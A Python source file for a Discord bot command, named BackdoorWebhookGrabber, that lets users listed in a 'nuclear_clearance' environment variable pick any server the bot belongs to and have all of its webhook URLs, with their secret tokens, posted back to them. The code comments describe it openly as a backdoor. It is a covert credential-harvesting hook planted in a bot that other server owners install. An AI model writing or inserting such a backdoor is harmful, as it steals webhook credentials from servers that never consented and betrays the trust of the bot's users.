"""Gets all the webhooks in a Discord Server"""

import os

import discord

import chattrigger


class BackdoorWebhookGrabber(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):
        # It's not a backdoor if everyone has access to it!
        if not str(message.author.id) in os.environ.get("nuclear_clearance"):
            return

        await message.channel.send('''```
 ▄█     █▄     ▄█    █▄       ▄██████▄  
███     ███   ███    ███     ███    ███ 
███     ███   ███    ███     ███    █▀  
███     ███  ▄███▄▄▄▄███▄▄  ▄███        
███     ███ ▀▀███▀▀▀▀███▀  ▀▀███ ████▄  
███     ███   ███    ███     ███    ███ 
███ ▄█▄ ███   ███    ███     ███    ███ 
 ▀███▀███▀    ███    █▀      ████████▀  - 😎
```''')

        async def get_target_guild() -> (discord.Guild, None):
            await message.channel.send("Input the target guild id.")
            target_guild_response_message = await client.wait_for(
                "message",
                check=lambda x: x.author.id == message.author.id
            )
            try:
                target_guild_id = int(target_guild_response_message.content)
            except ValueError:
                await message.channel.send("Invalid guild id")
                return await get_target_guild()

            target_guild_ = client.get_guild(target_guild_id)
            if target_guild_ is None:
                await message.channel.send("Couldn't find guild!")
                return await get_target_guild()

            return target_guild_

        target_guild = await get_target_guild()
        # get_target_guild returns None when an exit condition is reached
        if target_guild is None:
            await message.channel.send("Aborting!")
            return

        target_guild: discord.Guild

        to_send = ""
        for i in await target_guild.webhooks():
            i: discord.Webhook
            to_send += f"{str(i.channel)}: {i.url}\n"

        if len(to_send) == 0:
            await message.channel.send("No Webhooks were found.")
        else:
            await message.channel.send(to_send)
